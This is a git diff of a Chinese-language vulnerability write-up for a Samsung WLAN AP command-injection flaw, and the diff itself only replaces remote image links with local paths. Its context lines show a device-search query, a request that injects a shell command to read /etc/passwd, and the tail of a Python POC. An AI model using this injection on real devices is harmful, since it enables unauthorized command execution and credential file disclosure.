@@ -20,7 +20,7 @@ title=="Samsung WLAN AP"
 
 登录页面如下
 
-![](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202110918151.png)
+![](./images/202202110918151.png)
 
 请求包如下
 
@@ -33,7 +33,7 @@ Content-Length: 48
 command1=shell:cat /etc/passwd| dd of=/tmp/a.txt
 ```
 
-![](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202110918410.png)
+![](./images/202202110918410.png)
 
 ## 漏洞POC
 
@@ -97,4 +97,4 @@ if __name__ == '__main__':
     POC_1(target_url)
 ```
 
-![](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202110918137.png)
+![](./images/202202110918137.png)
